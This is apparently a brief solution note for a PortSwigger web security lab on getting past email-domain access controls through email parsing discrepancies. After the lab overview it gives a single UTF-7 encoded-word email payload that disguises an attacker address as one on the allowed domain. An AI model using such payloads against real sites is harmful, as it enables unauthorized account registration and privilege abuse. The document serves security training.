# Lab: Bypassing access controls using email address parsing discrepancies
url: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies

# Overview:
This lab validates email addresses to prevent attackers from registering addresses from unauthorized domains. There is a parser discrepancy in the validation logic and library used to parse email addresses.

To solve the lab, exploit this flaw to register an account and delete carlos

# Analysis:

payload:
=?utf-7?q?attacker&AEA-[email-id]&ACA-?=@ginandjuice.shop